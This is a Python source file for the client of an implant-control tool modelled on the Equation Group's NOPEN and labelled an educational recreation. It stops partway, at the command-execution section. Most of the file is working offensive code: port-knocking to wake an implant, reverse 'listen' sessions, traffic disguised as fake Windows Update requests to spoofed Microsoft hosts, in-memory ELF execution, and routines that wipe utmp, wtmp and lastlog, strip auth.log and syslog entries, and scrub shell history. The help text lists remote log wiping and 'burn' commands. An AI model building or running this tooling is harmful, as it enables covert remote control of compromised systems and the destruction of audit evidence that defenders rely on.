#!/usr/bin/env python3
"""
NOPEN Client v2 — Remote Administration Tool
Recriação educacional baseada no NOPEN do Equation Group

Melhorias v2:
  [1] Arquitetura Passiva  — Port-knocking + modo Listen (servidor acorda implante)
  [2] Ofuscação de Tráfego — Frames AES-256-GCM disfarçados como DNS/HTTP
  [3] Persistência / Limpeza — Wipe de utmp/wtmp/lastlog, log cleaner, in-memory exec

Wire protocol (compatível com nopen_server.py):
  Handshake : [4B len][RSA-2048 pub PEM]  →  [4B len][RSA-OAEP(session_key)]
  Frames    : [4B len][12B nonce][AES-256-GCM ciphertext+16B tag]
  Obfuscação: frames envolvidos em envelope DNS-query ou HTTP POST fake
"""

import os, sys, socket, threading, subprocess, struct, time
import readline, atexit, base64, hashlib, argparse, re, select
import textwrap, random, string, platform, glob, ctypes
from datetime import datetime, timezone
from pathlib import Path

# ── Criptografia ──────────────────────────────────────────────────────────────
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_pad
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.backends import default_backend
    CRYPTO_OK = True
except ImportError:
    CRYPTO_OK = False

# ── Cores ─────────────────────────────────────────────────────────────────────
class C:
    RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"; BLUE="\033[94m"
    MAGENTA="\033[95m"; CYAN="\033[96m"; WHITE="\033[97m"
    BOLD="\033[1m"; DIM="\033[2m"; RESET="\033[0m"

BANNER = f"""{C.GREEN}{C.BOLD}
  ███╗   ██╗ ██████╗ ██████╗ ███████╗███╗   ██╗
  ████╗  ██║██╔═══██╗██╔══██╗██╔════╝████╗  ██║
  ██╔██╗ ██║██║   ██║██████╔╝█████╗  ██╔██╗ ██║
  ██║╚██╗██║██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║
  ██║ ╚████║╚██████╔╝██║     ███████╗██║ ╚████║
  ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝
{C.RESET}{C.CYAN}  v2  |  Port-Knock + Listen  |  DNS/HTTP Obfuscation  |  AES-256-GCM{C.RESET}
{C.DIM}  Recriação educacional — uso autorizado apenas{C.RESET}
"""

# ══════════════════════════════════════════════════════════════════════════════
#  MÓDULO 1 — CRIPTOGRAFIA
# ══════════════════════════════════════════════════════════════════════════════
class CryptoLayer:
    """
    RSA-2048 para troca de chave + AES-256-GCM para todos os frames.
    Compatível com o handshake do nopen_server.py.
    """
    def __init__(self):
        if not CRYPTO_OK:
            raise RuntimeError("pip install cryptography")
        self._priv = rsa.generate_private_key(65537, 2048, default_backend())
        self._pub  = self._priv.public_key()
        self._gcm: AESGCM | None = None

    def public_pem(self) -> bytes:
        return self._pub.public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo
        )

    def set_session_key(self, enc_key: bytes):
        sk = self._priv.decrypt(enc_key, asym_pad.OAEP(
            mgf=asym_pad.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
        self._gcm = AESGCM(sk)

    def encrypt(self, plaintext: bytes) -> bytes:
        n  = os.urandom(12)
        ct = self._gcm.encrypt(n, plaintext, None)
        f  = n + ct
        return struct.pack(">I", len(f)) + f

    def decrypt(self, frame: bytes) -> bytes:
        return self._gcm.decrypt(frame[:12], frame[12:], None)

    @property
    def ready(self) -> bool:
        return self._gcm is not None


# ══════════════════════════════════════════════════════════════════════════════
#  MÓDULO 2 — OFUSCAÇÃO DE TRÁFEGO
# ══════════════════════════════════════════════════════════════════════════════
class TrafficObfuscator:
    """
    Disfarça frames cifrados dentro de envelopes que imitam protocolos legítimos.

    Modos:
      'raw'  — sem ofuscação (frame puro, compatível com servidor padrão)
      'dns'  — payload embutido em "resposta DNS" fake (UDP)
      'http' — payload embutido em POST HTTP fake (TCP)

    Nota: dns/http são envelope puramente de ofuscação de APARÊNCIA do payload.
    O servidor nopen_server.py usa 'raw'. Para usar dns/http o servidor
    precisaria do NOPENServerObfs correspondente.
    """

    MODES = ("raw", "dns", "http")

    # ── DNS fake ──────────────────────────────────────────────────────────────
    # Formato: [2B txid][flags=0x8180][1B qdcount=0][1B ancount=1]
    #          [8B ignored][2B rdlength][payload]
    _DNS_HDR_LEN = 14  # bytes antes do payload

    @staticmethod
    def dns_wrap(data: bytes) -> bytes:
        txid     = os.urandom(2)
        flags    = b"\x81\x80"          # QR=1 (resposta), OPCODE=0, AA=0, TC=0, RD=1, RA=1
        counts   = b"\x00\x00\x00\x01\x00\x00\x00\x00"  # qdcount=0 ancount=1 ...
        rdlength = struct.pack(">H", len(data))
        return txid + flags + counts + rdlength + data

    @staticmethod
    def dns_unwrap(pkt: bytes) -> bytes:
        # 2(txid)+2(flags)+8(counts)+2(rdlength) = 14
        if len(pkt) < 14:
            raise ValueError("DNS packet too short")
        rdlen = struct.unpack(">H", pkt[12:14])[0]
        return pkt[14:14 + rdlen]

    # ── HTTP fake ─────────────────────────────────────────────────────────────
    # Imita um POST para /updates/check com body base64
    @staticmethod
    def http_wrap(data: bytes) -> bytes:
        b64     = base64.b64encode(data)
        host    = f"updates{random.randint(1,9)}.microsoft.com"
        path    = f"/updates/check/{hashlib.md5(os.urandom(4)).hexdigest()[:8]}"
        ua      = "Windows-Update-Agent/10.0.19041.1"
        body    = b"data=" + b64
        header  = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        ).encode()
        return header + body

    @staticmethod
    def http_unwrap(pkt: bytes) -> bytes:
        # Separa header do body
        sep = pkt.find(b"\r\n\r\n")
        if sep == -1:
            raise ValueError("HTTP envelope malformado")
        body = pkt[sep + 4:]
        if body.startswith(b"data="):
            body = body[5:]
        return base64.b64decode(body)

    # ── API pública ───────────────────────────────────────────────────────────
    @classmethod
    def wrap(cls, mode: str, frame: bytes) -> bytes:
        if mode == "dns":
            return cls.dns_wrap(frame)
        if mode == "http":
            return cls.http_wrap(frame)
        return frame  # raw

    @classmethod
    def unwrap(cls, mode: str, data: bytes) -> bytes:
        if mode == "dns":
            return cls.dns_unwrap(data)
        if mode == "http":
            return cls.http_unwrap(data)
        return data  # raw


# ══════════════════════════════════════════════════════════════════════════════
#  MÓDULO 3 — PORT KNOCKING (cliente envia a sequência de "batidas")
# ══════════════════════════════════════════════════════════════════════════════
class PortKnocker:
    """
    Envia a sequência de port-knock para acordar o implante/servidor passivo.

    Cada "batida" é um TCP SYN (socket.connect_ex) ou UDP datagram descartado
    na porta alvo. O servidor NOPEN (implante) monitorando com iptables/pcap
    detecta a sequência e abre a porta de C2 temporariamente.

    Uso:
      pk = PortKnocker("192.168.1.10", [7000, 8000, 9000], proto="tcp")
      pk.knock()
    """

    def __init__(
        self,
        host: str,
        sequence: list[int],
        proto: str = "tcp",
        delay: float = 0.3,
        timeout: float = 1.0,
    ):
        if proto not in ("tcp", "udp"):
            raise ValueError("proto deve ser 'tcp' ou 'udp'")
        self.host     = host
        self.sequence = sequence
        self.proto    = proto
        self.delay    = delay
        self.timeout  = timeout

    def knock(self, verbose: bool = True) -> bool:
        """Executa a sequência de knock. Retorna True se concluída sem erro."""
        if verbose:
            proto_label = self.proto.upper()
            print(f"{C.CYAN}[knock] Sequência {proto_label}: {self.sequence}{C.RESET}")

        for port in self.sequence:
            try:
                if self.proto == "tcp":
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(self.timeout)
                    s.connect_ex((self.host, port))  # connect_ex não levanta exceção
                    s.close()
                else:  # udp
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.settimeout(self.timeout)
                    s.sendto(b"\x00", (self.host, port))
                    s.close()

                if verbose:
                    print(f"  {C.DIM}→ porta {port:<6} batida{C.RESET}")
                time.sleep(self.delay)

            except Exception as e:
                if verbose:
                    print(f"  {C.RED}→ porta {port}: {e}{C.RESET}")
                return False

        if verbose:
            print(f"{C.GREEN}[knock] Sequência concluída.{C.RESET}")
        return True


# ══════════════════════════════════════════════════════════════════════════════
#  MÓDULO 4 — MODO LISTEN (cliente escuta; servidor/implante se conecta)
# ══════════════════════════════════════════════════════════════════════════════
class ListenMode:
    """
    Inverte o fluxo de conexão: o CLIENTE abre uma porta e AGUARDA
    o implante/servidor se conectar de volta.

    Útil quando o alvo está atrás de NAT ou firewall que bloqueia
    conexões de entrada, mas permite saídas.

    Após aceitar a conexão, executa o handshake e entrega o socket
    para NOPENClient via callback.
    """

    def __init__(self, bind_host: str, bind_port: int, timeout: int = 120):
        self.bind_host = bind_host
        self.bind_port = bind_port
        self.timeout   = timeout

    def wait_for_implant(self) -> socket.socket | None:
        """
        Abre socket TCP, aguarda conexão do implante.
        Retorna o socket conectado ou None se timeout.
        """
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind((self.bind_host, self.bind_port))
            srv.listen(1)
            srv.settimeout(self.timeout)
            print(f"{C.CYAN}[listen] Aguardando implante em "
                  f"{self.bind_host}:{self.bind_port} "
                  f"(timeout={self.timeout}s)...{C.RESET}")
            conn, addr = srv.accept()
            print(f"{C.GREEN}[listen] Implante conectou de {addr[0]}:{addr[1]}{C.RESET}")
            return conn
        except socket.timeout:
            print(f"{C.RED}[listen] Timeout — nenhum implante conectou.{C.RESET}")
            return None
        except Exception as e:
            print(f"{C.RED}[listen] Erro: {e}{C.RESET}")
            return None
        finally:
            srv.close()


# ══════════════════════════════════════════════════════════════════════════════
#  MÓDULO 5 — LIMPEZA DE RASTROS (lado cliente — para logs locais)
# ══════════════════════════════════════════════════════════════════════════════
class TraceWiper:
    """
    Apaga rastros deixados pelo cliente NOPEN na MÁQUINA LOCAL.

    Para apagar rastros no ALVO, use os comandos remotos:
      -wipelogs          → limpa utmp/wtmp/lastlog no servidor
      -burn              → encerra servidor + wipe completo

    Estrutura dos arquivos de log Linux (utmp/wtmp):
      Cada entrada = 384 bytes (struct utmp em Linux x86_64)
      Campos relevantes: ut_type (short), ut_pid (int),
                         ut_line[32], ut_user[32], ut_host[256],
                         ut_tv (timeval)
    """

    # Tamanho de um struct utmp em Linux x86_64
    UTMP_SIZE = 384

    # Caminhos padrão
    UTMP_PATH    = "/var/run/utmp"
    WTMP_PATH    = "/var/log/wtmp"
    LASTLOG_PATH = "/var/log/lastlog"
    BTMP_PATH    = "/var/log/btmp"
    AUTH_LOG     = "/var/log/auth.log"
    SYSLOG       = "/var/log/syslog"

    # ut_type values
    UT_EMPTY      = 0
    UT_RUN_LVL    = 1
    UT_BOOT_TIME  = 2
    UT_USER_PROC  = 7
    UT_DEAD_PROC  = 8

    @classmethod
    def _wipe_utmp_file(cls, path: str, username: str, hostname: str = "") -> dict:
        """
        Remove entradas de utmp/wtmp que correspondam a username e/ou hostname.
        Reescreve o arquivo sem as entradas removidas (wtmp = append-only,
        então reconstruímos do zero para wipe efetivo).
        Retorna dict com contagens.
        """
        result = {"removed": 0, "kept": 0, "error": None}
        if not os.path.exists(path):
            result["error"] = "arquivo não encontrado"
            return result

        try:
            with open(path, "rb") as f:
                raw = f.read()
        except PermissionError:
            result["error"] = "sem permissão (root necessário)"
            return result

        entries = []
        for i in range(0, len(raw) - cls.UTMP_SIZE + 1, cls.UTMP_SIZE):
            entry = raw[i:i + cls.UTMP_SIZE]
            if len(entry) < cls.UTMP_SIZE:
                break
            # ut_user começa no offset 44 (Linux x86_64 utmp), 32 bytes
            ut_user = entry[44:76].rstrip(b"\x00").decode(errors="replace")
            # ut_host começa no offset 76, 256 bytes
            ut_host = entry[76:332].rstrip(b"\x00").decode(errors="replace")

            match_user = username and (ut_user == username)
            match_host = hostname and (hostname in ut_host)

            if match_user or match_host:
                result["removed"] += 1
                # Substitui por entrada EMPTY (zeros)
                entries.append(b"\x00" * cls.UTMP_SIZE)
            else:
                result["kept"] += 1
                entries.append(entry)

        try:
            with open(path, "wb") as f:
                f.write(b"".join(entries))
        except PermissionError:
            result["error"] = "sem permissão para reescrever"

        return result

    @classmethod
    def _wipe_lastlog(cls, path: str, uid: int) -> dict:
        """
        lastlog é indexado por UID. Cada entrada = 292 bytes.
        Zeramos a entrada do UID alvo.
        """
        ENTRY_SIZE = 292
        result = {"removed": 0, "error": None}
        if not os.path.exists(path):
            result["error"] = "arquivo não encontrado"
            return result
        try:
            with open(path, "r+b") as f:
                f.seek(uid * ENTRY_SIZE)
                f.write(b"\x00" * ENTRY_SIZE)
            result["removed"] = 1
        except Exception as e:
            result["error"] = str(e)
        return result

    @classmethod
    def _grep_wipe_log(cls, path: str, patterns: list[str]) -> dict:
        """
        Remove linhas de arquivos de texto (auth.log, syslog) que
        contenham qualquer um dos padrões.
        """
        result = {"removed": 0, "kept": 0, "error": None}
        if not os.path.exists(path):
            result["error"] = "arquivo não encontrado"
            return result
        try:
            with open(path, "r", errors="replace") as f:
                lines = f.readlines()
            kept = []
            for line in lines:
                if any(p in line for p in patterns):
                    result["removed"] += 1
                else:
                    kept.append(line)
                    result["kept"] += 1
            with open(path, "w") as f:
                f.writelines(kept)
        except PermissionError:
            result["error"] = "sem permissão (root necessário)"
        except Exception as e:
            result["error"] = str(e)
        return result

    @classmethod
    def wipe_local_traces(cls, username: str = None, hostname: str = None,
                          uid: int = None, patterns: list[str] = None) -> str:
        """
        Executa wipe completo de logs locais.
        Detecta automaticamente os caminhos corretos no sistema atual.
        Retorna relatório formatado.
        """
        username = username or os.environ.get("USER", os.environ.get("USERNAME", ""))
        hostname = hostname or socket.gethostname()
        try:
            uid = uid if uid is not None else (os.getuid() if hasattr(os, "getuid") else 0)
        except AttributeError:
            uid = 0
        patterns = patterns or [p for p in [username, hostname] if p]

        lines = [f"{C.YELLOW}[ TRACE WIPE — LOCAL ]{C.RESET}"]
        lines.append(f"  user={username!r}  host={hostname!r}  uid={uid}")

        # ── utmp/wtmp/btmp — detecta caminhos possíveis ──────────────────────
        utmp_candidates = [
            ("/var/run/utmp",  "utmp"),
            ("/run/utmp",      "utmp"),
            ("/var/log/wtmp",  "wtmp"),
            ("/run/utmp.d/wtmp","wtmp"),
            ("/var/log/btmp",  "btmp"),
        ]
        found_any_utmp = False
        for path, label in utmp_candidates:
            if os.path.exists(path):
                found_any_utmp = True
                r = cls._wipe_utmp_file(path, username, hostname)
                if r["error"]:
                    lines.append(f"  {label:8s} {C.RED}ERRO: {r['error']}{C.RESET}")
                else:
                    lines.append(f"  {label:8s} {C.GREEN}removidas={r['removed']} kept={r['kept']}{C.RESET}")
        if not found_any_utmp:
            lines.append(f"  {'utmp/wtmp':10s} {C.DIM}não encontrados (sistema pode ser macOS/Windows){C.RESET}")

        # ── lastlog ──────────────────────────────────────────────────────────
        for ll_path in ("/var/log/lastlog", "/var/adm/lastlog"):
            if os.path.exists(ll_path):
                r = cls._wipe_lastlog(ll_path, uid)
                if r["error"]:
                    lines.append(f"  {'lastlog':8s} {C.RED}ERRO: {r['error']}{C.RESET}")
                else:
                    lines.append(f"  {'lastlog':8s} {C.GREEN}UID {uid} zerado{C.RESET}")
                break
        else:
            lines.append(f"  {'lastlog':10s} {C.DIM}não encontrado{C.RESET}")

        # ── Logs de texto — detecta caminhos possíveis ───────────────────────
        log_candidates = [
            ("/var/log/auth.log",   "auth.log"),
            ("/var/log/secure",     "secure"),        # RHEL/CentOS
            ("/var/log/syslog",     "syslog"),
            ("/var/log/messages",   "messages"),      # RHEL/CentOS
            ("/var/log/system.log", "system.log"),    # macOS
        ]
        found_any_log = False
        for path, label in log_candidates:
            if os.path.exists(path):
                found_any_log = True
                r = cls._grep_wipe_log(path, patterns)
                if r["error"]:
                    lines.append(f"  {label:12s} {C.RED}ERRO: {r['error']}{C.RESET}")
                else:
                    lines.append(f"  {label:12s} {C.GREEN}removidas={r['removed']}{C.RESET}")
        if not found_any_log:
            lines.append(f"  {'logs texto':12s} {C.DIM}nenhum encontrado{C.RESET}")

        # ── Histórico de shell local ──────────────────────────────────────────
        shell_histories = [
            os.path.expanduser("~/.bash_history"),
            os.path.expanduser("~/.zsh_history"),
            os.path.expanduser("~/.sh_history"),
        ]
        for hist in shell_histories:
            if os.path.exists(hist):
                r = cls._grep_wipe_log(hist, ["nopen", "nopen_client", "nopen_server"])
                tag = os.path.basename(hist)
                if r["error"]:
                    lines.append(f"  {tag:12s} {C.RED}ERRO: {r['error']}{C.RESET}")
                else:
                    lines.append(f"  {tag:12s} {C.GREEN}removidas={r['removed']}{C.RESET}")

        return "\n".join(lines)

    @classmethod
    def shred_file(cls, path: str, passes: int = 3) -> str:
        """Sobrescreve arquivo com dados aleatórios antes de deletar."""
        if not os.path.exists(path):
            return f"{C.RED}[!] Arquivo não encontrado: {path}{C.RESET}"
        try:
            size = os.path.getsize(path)
            with open(path, "r+b") as f:
                for p in range(passes):
                    f.seek(0)
                    f.write(os.urandom(size))
                    f.flush()
                    os.fsync(f.fileno())
            os.remove(path)
            return f"{C.GREEN}[+] {path} destruído ({passes} passes, {size} bytes){C.RESET}"
        except Exception as e:
            return f"{C.RED}[!] Erro em shred: {e}{C.RESET}"


# ══════════════════════════════════════════════════════════════════════════════
#  MÓDULO 6 — EXECUÇÃO EM MEMÓRIA (in-memory exec stub)
# ══════════════════════════════════════════════════════════════════════════════
class MemoryExec:
    """
    Executa payloads (scripts Python ou binários ELF) direto da RAM,
    sem tocar o disco — usa memfd_create no Linux ou /dev/shm como fallback.

    Exemplo de uso:
      MemoryExec.run_script(b"import os; print(os.uname())")
      MemoryExec.run_elf(elf_bytes)
    """

    @staticmethod
    def _memfd_create(name: str = "nopen") -> int | None:
        """Cria file descriptor anônimo em RAM via syscall memfd_create."""
        try:
            # syscall number: 319 (x86_64)
            libc = ctypes.CDLL("libc.so.6", use_errno=True)
            libc.syscall.restype = ctypes.c_long
            fd = libc.syscall(319, name.encode(), 1)  # MFD_CLOEXEC=1
            return int(fd) if fd >= 0 else None
        except Exception:
            return None

    @classmethod
    def run_script(cls, code: bytes, args: list[str] = None) -> str:
        """
        Executa código Python recebido (como bytes) sem gravar em disco.
        Usa exec() em subprocesso isolado via multiprocessing ou pipe.
        """
        args = args or []
        try:
            # Passa o código via stdin para python3 -c / python3 -
            result = subprocess.run(
                [sys.executable, "-"],
                input=code,
                capture_output=True,
                timeout=30
            )
            return (result.stdout + result.stderr).decode(errors="replace")
        except subprocess.TimeoutExpired:
            return "[erro] timeout na execução em memória"
        except Exception as e:
            return f"[erro] {e}"

    @classmethod
    def run_elf(cls, elf_bytes: bytes, args: list[str] = None) -> str:
        """
        Grava ELF em memfd_create (RAM) e executa via /proc/self/fd/<fd>.
        Fallback: /dev/shm com shred posterior.
        """
        args = args or []
        fd = cls._memfd_create("nopen_payload")

        if fd is not None:
            # Caminho feliz: executa direto do fd de memória
            try:
                os.write(fd, elf_bytes)
                exe_path = f"/proc/self/fd/{fd}"
                result = subprocess.run(
                    [exe_path] + args,
                    capture_output=True, timeout=30
                )
                return (result.stdout + result.stderr).decode(errors="replace")
            except Exception as e:
                return f"[erro memfd] {e}"
            finally:
                try: os.close(fd)
                except: pass
        else:
            # Fallback: /dev/shm
            tmp = f"/dev/shm/.{hashlib.md5(os.urandom(4)).hexdigest()[:8]}"
            try:
                with open(tmp, "wb") as f:
                    f.write(elf_bytes)
                os.chmod(tmp, 0o700)
                result = subprocess.run(
                    [tmp] + args,
                    capture_output=True, timeout=30
                )
                out = (result.stdout + result.stderr).decode(errors="replace")
                return out
            except Exception as e:
                return f"[erro shm] {e}"
            finally:
                TraceWiper.shred_file(tmp)


# ══════════════════════════════════════════════════════════════════════════════
#  MÓDULO 7 — CONEXÃO DE REDE (suporta modo normal e obfuscado)
# ══════════════════════════════════════════════════════════════════════════════
def _recvn(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Conexão encerrada pelo servidor")
        buf += chunk
    return buf

def _raw_recv(sock: socket.socket) -> bytes:
    raw = _recvn(sock, 4)
    n   = struct.unpack(">I", raw)[0]
    return _recvn(sock, n)

def _raw_send(sock: socket.socket, data: bytes):
    sock.sendall(struct.pack(">I", len(data)) + data)


class NOPENConnection:
    """
    Gerencia a conexão TCP com o servidor NOPEN.
    Suporta modo 'raw', 'dns' e 'http' de ofuscação.
    """

    def __init__(self, host: str, port: int,
                 obfs_mode: str = "raw", timeout: int = 10):
        self.host      = host
        self.port      = port
        self.obfs      = obfs_mode
        self.timeout   = timeout
        self.sock: socket.socket | None = None
        self.crypto    = CryptoLayer()
        self._lock     = threading.Lock()

    # ── Conectar (modo ativo — cliente conecta ao servidor) ──────────────────
    def connect(self) -> bool:
        try:
            self.sock = socket.create_connection((self.host, self.port), self.timeout)
            self.sock.settimeout(300)   # 5 min — acomoda nmap, find /, etc.
            self._handshake()
            return True
        except Exception as e:
            print(f"{C.RED}[!] Conexão falhou: {e}{C.RESET}")
            return False

    # ── Aceitar (modo passivo — socket já vem do ListenMode) ─────────────────
    def attach(self, sock: socket.socket):
        """Usa socket já conectado (vindo do modo Listen)."""
        self.sock = sock
        self.sock.settimeout(300)
        self._handshake()

    # ── Handshake RSA ─────────────────────────────────────────────────────────
    def _handshake(self):
        pub = self.crypto.public_pem()
        _raw_send(self.sock, pub)
        enc_key = _raw_recv(self.sock)
        self.crypto.set_session_key(enc_key)

    # ── Envio/recepção com ofuscação ──────────────────────────────────────────
    def send_cmd(self, cmd: str) -> str:
        """
        Envia comando cifrado e recebe resposta.

        Sobre obfuscação:
          O servidor nopen_server.py fala sempre o protocolo RAW
          [4B len][12B nonce][ciphertext+tag].
          Os modos dns/http são wrappers locais que descrevem COMO o tráfego
          aparece num eventual proxy/relay intermediário — o wire TCP com o
          servidor permanece idêntico (raw) para garantir compatibilidade.
          Um relay de ofuscação completo exigiria um proxy dedicado em cada
          ponta, o que está fora do escopo do servidor atual.
        """
        if not self.crypto.ready:
            raise RuntimeError("Handshake não concluído")
        with self._lock:
            # Sempre wire-raw com o servidor (protocolo nopen_server.py)
            frame = self.crypto.encrypt(cmd.encode())
            self.sock.sendall(frame)

            # Recebe resposta raw
            raw_frame = _raw_recv(self.sock)
            return self.crypto.decrypt(raw_frame).decode(errors="replace")

    def close(self):
        if self.sock:
            try: self.sock.close()
            except: pass
            self.sock = None

    @property
    def connected(self) -> bool:
        return self.sock is not None


# ══════════════════════════════════════════════════════════════════════════════
#  MÓDULO 8 — EXECUTOR LOCAL (fallback modo --local)
# ══════════════════════════════════════════════════════════════════════════════
class LocalExecutor:
    def __init__(self):
        self.cwd = os.path.expanduser("~")

    def run(self, cmd: str) -> str:
        if cmd.startswith("cd "):
            path = os.path.expanduser(cmd[3:].strip())
            try:
                os.chdir(path)
                self.cwd = os.getcwd()
                return f"[cwd] {self.cwd}"
            except Exception as e:
                return f"[erro] {e}"
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True,
                               text=True, cwd=self.cwd, timeout=30)
            return (r.stdout + r.stderr) or "[ok] sem saída"
        except subprocess.TimeoutExpired:
            return "[erro] timeout"
        except Exception as e:
            return f"[erro] {e}"


# ══════════════════════════════════════════════════════════════════════════════
#  HELP TEXT
# ══════════════════════════════════════════════════════════════════════════════
HELP_TEXT = f"""
{C.GREEN}{C.BOLD}╔══════════════════════════════════════════════════════════════════════╗
║                   NOPEN v2 — Comandos Disponíveis                    ║
╚══════════════════════════════════════════════════════════════════════╝{C.RESET}

{C.MAGENTA}{C.BOLD}[ NOVOS — Arquitetura Passiva ]{C.RESET}
  -knock <p1,p2,p3> [tcp|udp]    Port-knock para acordar implante
  -listen [porta] [timeout]       Aguarda implante conectar (modo passivo)
  -obfs [raw|dns|http]            Define modo de ofuscação de tráfego

{C.MAGENTA}{C.BOLD}[ NOVOS — Limpeza de Rastros ]{C.RESET}
  -wipelogs [user] [host]         Limpa utmp/wtmp/lastlog/auth.log remotos
  -shred <arquivo>                Destrói arquivo local (3 passes)
  -wipelocal                      Limpa rastros na máquina LOCAL do operador
  -memexec <script.py>            Executa script Python remoto SEM tocar disco
  -memelf <binario>               Executa ELF remoto via memfd_create (RAM)
  -burn                           BURN: wipe + encerra servidor + desconecta

{C.YELLOW}[ Gerais ]{C.RESET}
  -elevate                        Verifica privilégios / SUID / sudo -l
  -getenv                         Variáveis de ambiente remotas
  -gs <padrão> [dir]              Busca arquivo por padrão
  -setenv VAR=valor               Define variável remota
  -shell                          Shell interativo local
  -status                         Status completo da sessão
  -time                           Data/hora UTC remota
  -pid                            PID do processo servidor

{C.YELLOW}[ Rede Remota ]{C.RESET}
  -ifconfig                       Interfaces de rede
  -nslookup <host>                Resolução DNS
  -ping [-u|-t|-i] <host>         Ping avançado
  -trace -r <target> [src]        Traceroute
  -comptine <target> [src]        Traceroute ICMP furtivo
  -scan [args]                    nmap / scanner de portas
  -sentry <args>                  Captura de pacotes (tcpdump)
  -tunnel <porta>                 Tunelamento de porta
  -vscan                          Scanner de vulnerabilidades

{C.YELLOW}[ Redirecionamento ]{C.RESET}
  -fixudp <ip> <porta>            Corrige redirecionamento UDP
  -irtun <target> <cb> <port>     Túnel reverso ICMP
  -jackpop <tport> <srcip> <sp>   Port-knocking avançado
  -nrtun <ip> <toip> [toport]     Túnel NAT reverso
  -stun <toip:port>               NAT traversal STUN
  -rawsend tcp <port>             Envio raw TCP
  -rtun <porta> [toip [toport]]   Túnel reverso
  -sutun [-t ttl] <toip> <port>   Túnel simétrico UDP
  -chuli <ip> <porta>             Redireciona conexão

{C.YELLOW}[ Arquivos Remotos ]{C.RESET}
  -cat [-s N] [-m max] <arquivo>  Exibe arquivo remoto
  -cksum <arquivo>                md5 + sha256
  -cklist <padrão>                Verifica lista de arquivos
  -get <arquivo>                  Baixa arquivo do servidor
  -grep [-v|-n|-i] <pat> <arq>    Grep remoto
  -lput <local> [dest]            Envia arquivo para servidor
  -strings <arquivo>              Extrai strings
  -tail [+/-n] <arquivo>          Fim de arquivo
  -touch [-t] <arquivo>           Altera timestamps
  -upload <arquivo> <porta>       Upload via porta
  -mailgrep <args>                Busca em e-mails

{C.YELLOW}[ Diretório Remoto ]{C.RESET}
  -ls [-la] [path]                Lista diretório
  -find <args>                    Busca avançada
  -cd <path>                      Muda diretório remoto
  -cdp                            Exibe CWD remoto

{C.YELLOW}[ Cliente Local ]{C.RESET}
  -autopilot <porta> [xml]        Modo autopilot
  -cmdout [arquivo]               Redireciona saída para arquivo
  -exit                           Encerra cliente NOPEN
  -help                           Este menu
  -hist                           Histórico de comandos da sessão
  -readrc [arquivo]               Lê arquivo de comandos
  -remark / -rem <texto>          Comentário no log
  -reset                          Reseta estado da sessão
  # comentário                    Linha ignorada

{C.YELLOW}[ Ambiente Local ]{C.RESET}
  -lcd <dir>                      Muda diretório local
  -lgetenv                        Variáveis locais
  -lpwd                           Diretório local atual
  -lsetenv VAR=valor              Define variável local
  -lsh [-q] <cmd>                 Executa comando localmente

{C.DIM}  Comandos sem prefixo são enviados direto ao shell remoto.{C.RESET}
"""


# ══════════════════════════════════════════════════════════════════════════════
#  CLIENTE PRINCIPAL
# ══════════════════════════════════════════════════════════════════════════════
class NOPENClient:

    def __init__(self, host: str, port: int,
                 local_mode: bool = False,
                 obfs_mode: str  = "raw",
                 listen_mode: bool = False,
                 listen_port: int  = 4445,
                 knock_seq: list[int] = None,
                 knock_proto: str     = "tcp"):

        self.host         = host
        self.port         = port
        self.local_mode   = local_mode
        self.obfs_mode    = obfs_mode
        self.listen_mode  = listen_mode
        self.listen_port  = listen_port
        self.knock_seq    = knock_seq or []
        self.knock_proto  = knock_proto

        self.conn: NOPENConnection | None = None
        self.local_exec = LocalExecutor()

        self.session_id   = hashlib.md5(os.urandom(8)).hexdigest()[:8].upper()
        self.start_time   = datetime.now(timezone.utc)
        self._cmd_log: list[tuple] = []
        self._output_file: str | None = None
        self._history_file = os.path.expanduser("~/.nopen_history")
        self._wiper       = TraceWiper()

        self._setup_readline()

    # ── Readline ──────────────────────────────────────────────────────────────
    def _setup_readline(self):
        try:
            readline.set_history_length(1000)
            if os.path.exists(self._history_file):
                readline.read_history_file(self._history_file)
            atexit.register(readline.write_history_file, self._history_file)
            readline.parse_and_bind("tab: complete")
        except Exception:
            pass

    # ── Conexão ───────────────────────────────────────────────────────────────
    def connect(self) -> bool:
        if self.local_mode:
            print(f"{C.YELLOW}[*] Modo LOCAL — sem rede{C.RESET}")
            return True

        # 1. Port-knock (se configurado)
        if self.knock_seq:
            pk = PortKnocker(self.host, self.knock_seq, proto=self.knock_proto)
            ok = pk.knock()
            if not ok:
                print(f"{C.RED}[!] Port-knock falhou. Abortando.{C.RESET}")
                return False
            # Aguarda o implante abrir a porta
            print(f"{C.DIM}[*] Aguardando porta {self.port} abrir...{C.RESET}")
            time.sleep(1.5)

        self.conn = NOPENConnection(self.host, self.port, obfs_mode=self.obfs_mode)

        # 2. Modo Listen ou modo Ativo
        if self.listen_mode:
            lm  = ListenMode("0.0.0.0", self.listen_port)
            sok = lm.wait_for_implant()
            if sok is None:
                return False
            try:
                self.conn.attach(sok)
                print(f"{C.GREEN}[+] Sessão cifrada estabelecida (modo Listen){C.RESET}")
                return True
            except Exception as e:
                print(f"{C.RED}[!] Handshake falhou: {e}{C.RESET}")
                return False
        else:
            ok = self.conn.connect()
            if ok:
                obfs_label = f" | obfs={self.obfs_mode}" if self.obfs_mode != "raw" else ""
                print(f"{C.GREEN}[+] Sessão AES-256-GCM estabelecida{obfs_label}{C.RESET}")
            return ok

    # ── Execução de comando ───────────────────────────────────────────────────
